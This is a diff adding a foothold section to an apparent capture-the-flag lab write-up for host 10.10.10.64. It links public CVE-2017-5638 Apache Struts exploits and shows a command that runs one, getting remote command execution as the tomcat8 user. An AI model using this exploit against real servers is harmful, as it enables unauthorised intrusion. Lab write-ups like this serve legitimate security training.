@@ -276,3 +276,35 @@ Starting gobuster in directory enumeration mode
 /GettingStarted.html  (Status: 200) [Size: 203]
 /Monitoring           (Status: 302) [Size: 0] [--> /Monitoring/]
 ```
+
+## Foothold
+- http://10.10.10.64/manager
+  - Probably `Tomcat` 
+
+![](./images/2.png)
+
+- http://10.10.10.64/Monitoring
+
+![](./images/3.png)
+
+- I can't register
+
+![](./images/4.png)
+
+- `Sign on` page
+
+![](./images/5.png)
+
+- It looks like a [Struts Web Framework](https://netbeans.apache.org//kb/docs/web/quickstart-webapps-struts.html)
+  - There is github page: https://github.com/FredBrave/CVE-2017-5638-ApacheStruts2.3.5
+    - Or https://github.com/rapid7/metasploit-framework/issues/8064
+```
+└─$ python3 cve-2017-5638.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c 'id'             
+uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)
+```
+
+- Couldn't make a shell, probably have to enumerate more to figure out what's going on
+  - Might have to use `forward` shell
+## User
+
+## Root
